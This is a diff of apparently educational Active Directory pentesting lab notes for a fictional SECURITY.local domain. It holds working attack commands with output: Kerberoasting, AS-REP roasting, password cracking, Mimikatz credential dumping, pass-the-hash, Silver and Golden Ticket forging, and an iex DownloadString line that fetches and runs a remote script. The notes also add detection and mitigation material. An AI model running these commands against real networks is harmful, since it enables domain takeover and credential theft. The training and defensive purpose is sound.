@@ -30,7 +30,7 @@
 
 - Active Directory Fundamentals
 	Understand Active Directory Architecture: Gain a comprehensive understanding of Active Directory components, including domains, domain controllers, forests, trust relationships, OUs and Group Policy Objects (GPOs).
-- Active Directory Penetration Testing Methodology & Process
+- Active Directory Penetration Testing Methodology and Process
 	Gain a comprehensive understanding of the Active Directory penetration testing methodology, including the systematic approach to assessing and exploiting vulnerabilities within AD environments.
 - Active Directory Enumeration
 	Conduct reconnaissance and enumeration of Active Directory environments using tools like PowerView and BloodHound to gather information about users, groups, permissions, and trust relationships.
@@ -108,7 +108,7 @@ A Windows domain is a collection of computers, servers, users, and devices that 
 
 In the context of Microsoft's Windows operating system, a domain is established using Active Directory (AD), which serves as the central directory service for authentication, authorization, and resource management.
 
-##### Authentication & Authorization
+##### Authentication and Authorization
 
 **Single Sign-On (SSO):** With Active Directory, employees at Foo Bank Inc. can <u>log in to their computers using a single set of credentials (username and password)</u>. These credentials are verified centrally by Active Directory, providing a seamless and secure authentication experience.
 
@@ -132,7 +132,7 @@ In the context of Microsoft's Windows operating system, a domain is established 
 
 **Scalability:** As Foo Bank Inc. grows, Active Directory can <u>scale</u> to accommodate the increasing number of users, computers, and resources. New departments or branch offices can be added to the existing Active Directory infrastructure, <u>maintaining centralized management and control</u>.
 
-### Users, Groups & Computers - Theory
+### Users, Groups and Computers - Theory
 
 Security principals refer to <u>entities in the Windows security infrastructure</u> that can be assigned permissions to access various resources within a Windows environment.
 These entities can represent <u>users, groups, computers, or services</u>, and they play a central role in controlling access to resources through security descriptors.
@@ -174,7 +174,7 @@ Administrators can manage computer accounts by adding, removing, or modifying th
 
 <u>OUs are containers in an AD domain used to organize and manage objects</u> like user accounts, computers, and groups. OUs are used to organize objects <u>in a logical manner</u> based on administrative, geographical, or departmental criteria. They provide a hierarchical structure for administrative delegation, Group Policy permissions, and other configurations application to multiple objects at once.
 
-#### Difference Between OUs & Security Groups
+#### Difference Between OUs and Security Groups
 
 - **OUs**: Used <u>for organizing and managing AD objects</u>, create a hierarchical structure.
 - **Security Groups**: Used <u>for access control and permissions</u>, can be organized in a flat structure.
@@ -299,10 +299,10 @@ Techniques:
 #### Persistence
 
 Techniques:
-- **Silver Ticket**: <u>Forging Kerberos service tickets to impersonate any service or computer account</u>.
-- **Golden Ticket**: <u>Forging Kerberos tickets to impersonate any user and access any resource within the AD environment</u>.
+- **Silver Ticket**: <u>Forging a Kerberos service ticket for a specific service by using the relevant service or computer account key</u>.
+- **Golden Ticket**: <u>Forging a Kerberos Ticket Granting Ticket (TGT) by using the `KRBTGT` account key to impersonate a chosen identity</u>.
 
-#### References & Resources
+#### References and Resources
 
 - [Orange Cyberdefense mindmaps](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg) ⭐
 - [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet). ⭐
@@ -802,14 +802,14 @@ In this lab environment, you will be provided with GUI access to a Windows machi
 **Objective**: Perform Active Directory enumeration.
 
 Below are the tasks that you need to perform:
-1. Enumerate local users & groups
+1. Enumerate local users and groups
 2. Enumerate Domain
 3. Enumerate Domain Users
 4. Enumerate Domain Computers
 5. Enumerate Domain Groups
 6. Enumerate Domain Shares
 7. Enumerate GPOs and OUs
-8. Enumerate Domain Trust & Forest Trust
+8. Enumerate Domain Trust and Forest Trust
 9. Enumerate ACLs
 10. Find Kerberoastable accounts
 11. Find AS-REP roastable accounts.
@@ -906,7 +906,7 @@ The best tools for this lab are:
 
 #### Lab Execution
 
-1. **Enumerate local users & groups**
+1. **Enumerate local users and groups**
 
 *Get current user*
 
@@ -1701,7 +1701,7 @@ T2-Roles
 Staging
 ```
 
-8. **Enumerate Domain Trust & Forest Trust**
+8. **Enumerate Domain Trust and Forest Trust**
 
 In an Active Directory environment, <u>trust represents a relationship established between two domains or forests. This relationship enables users from one domain or forest to access resources located in the other domain or forest</u>.
 - **Domain Trust** enables authentication between domains within the same forest or across separate forests, facilitating resource sharing and collaboration.
@@ -2145,7 +2145,7 @@ The best tools for this lab are:
 
 `cd C:\Tools`, `Import-Module .\PowerView.ps1`: to import the [PowerView module](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
 
-`GetDomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }`: to get the AS-REP roastable users.
+`Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }`: to get the AS-REP roastable users.
 (Using PowerView to list users with the "Do not require Kerberos preauthentication" option enabled, making them vulnerable to AS-REP Roasting attacks.)
 
 `.\Rubeus.exe asreproast /user:johnny /outfile:$HOME\Desktop\user_hash.txt`: to perform AS-REP roasting on a specific user and save the hash to a .txt file.
@@ -2391,7 +2391,7 @@ Your task is to identify accounts that have a Service Principal Name (SPN) enabl
 Below are the tasks that you need to perform:
 1. <u>Identify user accounts with Service Principal Name (SPN) enabled</u>.
 2. <u>Request a TGS ticket for the specified SPN</u> using Kerberos.
-	1. <u>Crack the password</u> from the TGS ticket using `Tgsrepcrack`.
+3. <u>Crack the password</u> from the TGS ticket using `Tgsrepcrack`.
 
 The best tools for this lab are:
 - PowerView.ps1
@@ -2399,13 +2399,13 @@ The best tools for this lab are:
 - Kerberoasting
 - Tgsrepcrack.
 
-#### Lab Soution
+#### Lab Solution
 
 `powershell -ep bypass`: to bypass the execution policy to allow running scripts.
 
 `cd C:\Tools`, `Import-Module .\PowerView.ps1`: to import the [PowerView module](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1).
 
-`Get-NetUser | Where-Object { $_.ServicePrincipalName } | fl`: to find and list all users with a Service Principal Name (SPN).
+`Get-NetUser | Where-Object { $_.ServicePrincipalName } | Format-List`: to find and list all users with a Service Principal Name (SPN).
 (Using PowerView to list users that have a Service Principal Name (SPN) set, indicating they are associated with a service that can be targeted for Kerberoasting.)
 `setspn -T research -Q */*`: to query all SPNs in the 'research' domain.
 (Querying the 'research' domain for all SPNs to identify services that can be targeted.)
@@ -2427,7 +2427,7 @@ The best tools for this lab are:
 
 #### Lab Execution
 
-*Terminal #1* (run as administrator)
+*Terminal #1* (run as administrator).
 
 `powershell -ep bypass`
 
@@ -2750,7 +2750,7 @@ Timeroast
 
 3. **Crack the password from the TGS ticket using Tgsrepcrack.**
 
-`python .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a10000-student@ops~research.SECURITY.local~1434-RESEARCH.SECURITY.LOCAL.kirbi`:
+`.\python.exe .\kerberoast-Python3\tgsrepcrack.py .\10k-worst-pass.txt .\1-40a10000-student@ops~research.SECURITY.local~1434-RESEARCH.SECURITY.LOCAL.kirbi`:
 ```
     USE HASHCAT, IT'S HELLA FASTER!!
 
@@ -2764,6 +2764,68 @@ Successfully cracked all tickets
 This command runs the Python script `tgsrepcrack.py` that uses the list of weak passwords (`10k-worst-pass.txt`) to attempt to crack the password encrypted in the TGS ticket file (`1-40a10000-student@ops~research.SECURITY.local~1434-RESEARCH.SECURITY.LOCAL.kirbi`). The script will display the cracked password once it's successful.
 
 After the script is executed, the cracked password is displayed, which is "maverick" in this instance. This illustrates the risk of using weak passwords and their vulnerability to password cracking tools and techniques. With the plaintext password, the attacker can authenticate to any resources the service account has access to, helping them to compromise data or escalate privileges.
+
+`Get-DomainController`:
+```
+Forest                     : SECURITY.local
+CurrentTime                : 12/18/2024 1:49:00 PM
+HighestCommittedUsn        : 49252
+OSVersion                  : Windows Server 2012 R2 Standard
+Roles                      : {PdcRole, RidRole, InfrastructureRole}
+Domain                     : research.SECURITY.local
+IPAddress                  : 10.0.0.165 ←
+SiteName                   : Default-First-Site-Name
+SyncFromAllServersCallback :
+InboundConnections         : {b611dabd-4abb-423b-9163-8df96997e2e0}
+OutboundConnections        : {96350cb4-e7cf-4854-b531-00320b4e9a54}
+Name                       : prod.research.SECURITY.local ←
+Partitions                 : {CN=Configuration,DC=SECURITY,DC=local, CN=Schema,CN=Configuration,DC=SECURITY,DC=local,
+                             DC=ForestDnsZones,DC=SECURITY,DC=local, DC=research,DC=SECURITY,DC=local...}
+```
+
+`.\PsExec64.exe \\10.0.0.165 -u research.SECURITY.local\stephen -p maverick cmd`:
+```
+PsExec v2.34 - Execute processes remotely
+Copyright (C) 2001-2021 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Could not start PSEXESVC service on 10.0.0.165:
+Access is denied.
+```
+
+`net use K: \\10.0.0.165\c$ /user:research.SECURITY.local\stephen maverick`:
+```
+The command completed successfully.
+```
+
+`wmic logicaldisk get name`:
+```
+Name
+C:
+K: ←
+```
+
+`cd K:`
+
+`ls`:
+```
+    Directory: K:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        8/22/2013   3:52 PM                PerfLogs
+d-r---        5/31/2023  10:23 AM                Program Files
+d-----        9/21/2021  12:28 PM                Program Files (x86)
+d-r---       12/18/2024   1:46 PM                Users
+d-----       12/18/2024   1:50 PM                Windows
+```
+
+`Enter-PSSession -ComputerName 10.0.0.165 -Credential (New-Object PSCredential("research.SECURITY.local\stephen", (ConvertTo-SecureString "maverick" -AsPlainText -Force)))`:
+```
+[10.0.0.165]: PS C:\Users\Stephen\Documents> whoami
+research\stephen
+```
 
 ---
 
@@ -2802,6 +2864,9 @@ The best tools for this lab are:
 (Retrieving general information about the current Active Directory domain.)
 `Find-LocalAdminAccess`: to find computers where the current user has local administrator access.
 (Identifying machines where the current user has local admin rights, which are potential targets for further exploitation.)
+
+`ls \\prod.research.SECURITY.local\c$`: to list the contents of the C$ share on the 'prod.research.SECURITY.local' machine (but access is denied).
+(Attempting to access the C$ share on the 'prod.research.SECURITY.local' machine, but access is denied.)
 
 `Enter-PSSession seclogs.research.SECURITY.local`: to enter a remote PowerShell session on the 'seclogs' machine in the 'research.SECURITY.local' domain.
 (Starting a remote session with the target machine 'seclogs.research.SECURITY.local' for further commands.)
@@ -3201,6 +3266,43 @@ We have successfully performed Pass-The-Hash attack using the domain admin NTLM 
 
 *Terminal #4* (elevated session).
 
+`whoami`:
+```
+research\student
+```
+
+`whoami /priv`:
+```
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State
+=============================== ========================================= ========
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Disabled
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Disabled
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
+SeCreatePagefilePrivilege       Create a pagefile                         Disabled
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
+SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege         Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
+SeTimeZonePrivilege             Change the time zone                      Disabled
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
+```
+
 *Access the Domain Controller*
 
 `ls \\prod.research.security.local\c$`:
@@ -3221,6 +3323,11 @@ d-----        9/27/2021   9:19 AM                Windows
 `hostname`:
 ```
 prod ←
+```
+
+`whoami`:
+```
+research\administrator
 ```
 
 `ipconfig`:
@@ -3284,13 +3391,6 @@ The best tools for this lab are:
 `ls \\prod.research.SECURITY.local\c$`: to list the contents of the C$ share on the 'prod.research.SECURITY.local' machine (but access is denied).
 (Attempting to access the C$ share on the 'prod.research.SECURITY.local' machine, but access is denied.)
 
-*Terminal #2*.
-
-`cd C:\Tools`, `dir`, `python -m http.server 80`: to start a simple HTTP server to serve the 'Invoke-Mimikatz.ps1' script.
-(Setting up a simple HTTP server to host and serve the Mimikatz script for remote execution.)
-
-*Terminal #1*.
-
 `Enter-PSSession seclogs.research.SECURITY.local`: to start a remote PowerShell session with the machine 'seclogs.research.SECURITY.local'.
 (Starting a remote session with the target machine 'seclogs.research.SECURITY.local' for further commands.)
 
@@ -3298,6 +3398,13 @@ The best tools for this lab are:
 (Confirming the identity of the current user in the remote session.)
 `whoami /priv`: to display the current user's privileges.
 (Checking the privileges of the current user to understand the level of access and permissions.)
+
+*Terminal #2*.
+
+`cd C:\Tools`, `dir`, `python -m http.server 80`: to start a simple HTTP server to serve the 'Invoke-Mimikatz.ps1' script.
+(Setting up a simple HTTP server to host and serve the Mimikatz script for remote execution.)
+
+*Terminal #1*.
 
 `iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')`: to download and execute the 'Invoke-Mimikatz.ps1' script from the specified URL.
 `Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'`: to list and export all Kerberos tickets from the current session.
@@ -3773,11 +3880,26 @@ The **Silver ticket** attack involves the <u>creation of a valid Ticket Granting
 - **Services operating under a user account (e.g., MSSQL)** <u>require the service account's password hash for Silver Ticket creation</u>.
 - **Services hosted by computers (e.g., Windows file share using "CIFS")** <u>require the computer account's password hash</u>.
 
+#### Operational Characteristics
+
+- **Scope:** A Silver Ticket grants access only to the service and host associated with the compromised service or computer account key; it does not provide domain-wide access by itself.
+- **KDC interaction:** The forged TGS can be presented directly to the target service without first requesting it from the KDC. This can reduce KDC-side visibility, but host and service logs may still reveal anomalous activity.
+- **Lifetime:** The ticket remains useful only while the target service accepts the key used to sign it. Rotating the relevant service or computer account password invalidates tickets forged with the old key.
+- **Required access:** Obtaining the relevant account hash requires sufficient privileges, but impersonating the Administrator account is a path used by this lab rather than a protocol requirement.
+
+See [MITRE ATT&CK T1558.002](https://attack.mitre.org/techniques/T1558/002/) for a concise description of the technique and its detection considerations.
+
 #### Lab Environment
 
 In this lab environment, you will be provided with GUI access to a Windows machine (2012). This machine will serve as your attacker machine. Your task in this lab is to generate a Silver ticket, targeting the CIFS service on the Domain Controller.
 
 **Objective:** Perform a Silver ticket attack targeting the CIFS service on the Domain Controller.
+
+Below are the tasks that you need to perform:
+1. Extract the Computer Account NTLM Hash
+2. Generate and Inject a Silver Ticket
+3. Access the Target Service or Resource
+4. Validate Access Using the Silver Ticket
 
 **Note:** All the tools are present in the `C:\Tools` directory.
 
@@ -3848,7 +3970,7 @@ The best tools for this lab are:
 `Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -ComputerName prod.research.security.local`: to dump the LSA secrets and inject them into the current session on the specified computer.
 (Extracting and injecting LSA secrets from the target machine to gain further access and control.)
 
-`Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-18580025440 /target:prod.research.SECURITY.local /service:CIFS /rc4:f2c8ca3e39546c1a3893dad14a6d2849 /ptt"'`: to create and inject a Silver Ticket for the specified domain and target machine.
+`Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /target:prod.research.SECURITY.local /service:CIFS /rc4:f2c8ca3e39546c1a3893dad14a6d2849 /ptt"'`: to create and inject a Silver Ticket for the specified domain and target machine.
 (Creating and injecting a Silver Ticket to grant specified permissions for the CIFS service on the target domain controller.)
 `klist`: to list the Kerberos tickets for the current user session.
 (Verifying that the Silver Ticket has been successfully injected by listing the Kerberos tickets.)
@@ -4447,7 +4569,7 @@ Now, we are all set to generate a Silver ticket.
 
 *Generate a Silver ticket*
 
-`Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-18580025440 /target:prod.research.SECURITY.local /service:CIFS /rc4:33ba952dd24648e1f12024e53111b2c2 /ptt`:
+`Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /target:prod.research.SECURITY.local /service:CIFS /rc4:33ba952dd24648e1f12024e53111b2c2 /ptt"'`:
 ```
 Hostname: client.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440
 
@@ -4527,10 +4649,17 @@ d-----        9/27/2021   9:19 AM                Windows
 
 ### Golden Ticket - Theory/Lab
 
-A **Golden Ticket** attack is a malicious cybersecurity attack where <u>a threat actor gains almost unlimited access to an organization's domain (devices, files, domain controllers, etc.)</u> by exploiting weaknesses in the Kerberos authentication protocol used by Microsoft Active Directory (AD). This allows the attacker to bypass normal authentication mechanisms, <u>by creating a forged Kerberos ticket</u>.
+A **Golden Ticket** attack uses a compromised `KRBTGT` account key to forge a Kerberos Ticket Granting Ticket (TGT) for a chosen identity. The privileges available through that ticket depend on the identity and authorization data placed in it.
 
-The increasing shift to cloud services and remote work has expanded the attack surface. Employees logging into company systems from personal devices and networks increase the risk of network breaches.
-This in turn has increased the risk that attackers will be able to break into a network and use a Golden Ticket attack to gain access.
+#### Operational Characteristics
+
+- **Scope:** A forged TGT can be used to request service tickets for resources throughout the domain, making a compromised `KRBTGT` key significantly broader in impact than a Silver Ticket.
+- **KDC interaction:** Forging the TGT bypasses the normal initial authentication exchange, but the forged TGT is commonly presented to the KDC to request service tickets. It does not simply eliminate all KDC interaction.
+- **Persistence:** The technique remains viable while the compromised `KRBTGT` key is accepted. Properly resetting the `KRBTGT` password twice, with replication and the required waiting period between resets, removes both retained keys and invalidates tickets forged with them.
+- **Detection:** Unusual ticket lifetimes, encryption types, account data, and ticket-request patterns can expose Golden Ticket activity.
+- **Required access:** This lab uses an Administrator context to retrieve the `KRBTGT` hash from a domain controller; that is the lab's privilege-escalation path rather than an intrinsic Kerberos requirement.
+
+See [MITRE ATT&CK T1558.001](https://attack.mitre.org/techniques/T1558/001/) and Microsoft's [KRBTGT reset procedure](https://learn.microsoft.com/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password) for the technique and its invalidation requirements.
 
 #### Lab Environment
 
@@ -4541,7 +4670,7 @@ Your task is to simulate a 'Golden Ticket' attack to exploit the Kerberos ticket
 **Objective**: Simulate a Kerberos: Golden Ticket attack to generate a ticket-granting ticket, and escalate privileges to obtain domain controller access.
 
 Below are the tasks that you need to perform:
-1. Extract Administrator's NTML Hash
+1. Extract Administrator's NTLM Hash
 2. Execute Pass-the-Hash Attack
 3. Retrieve KRBTGT Account Hash
 4. Generate and Implement a Golden Ticket
@@ -4581,8 +4710,8 @@ The best tools for this lab are:
 `Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName prod.research.SECURITY.local`: to dump the LSA secrets from the specified computer.
 (Dumping LSA secrets, which includes sensitive information like the KRBTGT account hash necessary for Golden Ticket creation.)
 
-`Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-18580025440-500 /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`: to create and inject a Golden Ticket for the specified user, domain, and SID.
-(Creating and injecting a Golden Ticket, which grants the specified user unlimited access to the domain.)
+`Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`: to create and inject a Golden Ticket for the specified user, domain, and SID.
+(Creating and injecting a Golden Ticket that can provide broad domain access according to the forged identity and authorization data.)
 `klist`: to list the Kerberos tickets for the current user session.
 (Verifying that the Golden Ticket has been successfully injected by listing the Kerberos tickets.)
 
@@ -4591,7 +4720,7 @@ The best tools for this lab are:
 
 #### Lab Execution
 
-1. **Extract Administrator’s NTML Hash**
+1. **Extract Administrator’s NTLM Hash**
 
 To proceed with the attack, you need to ensure that you are running PowerShell as a local administrator. This ensures that you have the necessary permissions to execute the Invoke-Mimikatz commands.
 
@@ -4643,9 +4772,9 @@ At line:1 char:1
     + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand
 ```
 
-This command is attempting to list the directory of the C drive on the domain controller at "prod.research.security.local". If access is granted, you won't need to proceed with extracting the Administrator's NTML hash.
+This command is attempting to list the directory of the C drive on the domain controller at "prod.research.security.local". If access is granted, you won't need to proceed with extracting the Administrator's NTLM hash.
 
-*Extract Admin NTML Hash*
+*Extract Admin NTLM Hash*
 
 `Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'`:
 ```
@@ -4744,7 +4873,7 @@ The `privilege::debug` command enables debug privileges in the current session, 
 
 2. **Execute Pass-the-Hash Attack**
 
-Now that we've successfully extracted the NTML hash of the administrator, we can use this information to authenticate ourselves as the administrator without needing their actual password. This technique is known as a Pass-the-Hash (PTH) attack.
+Now that we've successfully extracted the NTLM hash of the administrator, we can use this information to authenticate ourselves as the administrator without needing their actual password. This technique is known as a Pass-the-Hash (PTH) attack.
 
 `Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'`:
 ```
@@ -4846,7 +4975,7 @@ NTLM : 3851a76dc1b568179f71427c95971537
 
 The final step is to create a Golden ticket. This is a forged Ticket Granting Ticket (TGT) that can provide you with extensive privileges and control over the Active Directory domain.
 
-`Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-18580025440-500 /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`:
+`Invoke-Mimikatz -Command '"kerberos::golden /user:administrator /domain:research.SECURITY.local /sid:S-1-5-21-1693200156-3137632808-1858025440 /krbtgt:0e3cab3ba66afddb664025d96a8dc4d2 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`:
 ```
 Hostname: client.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440
 
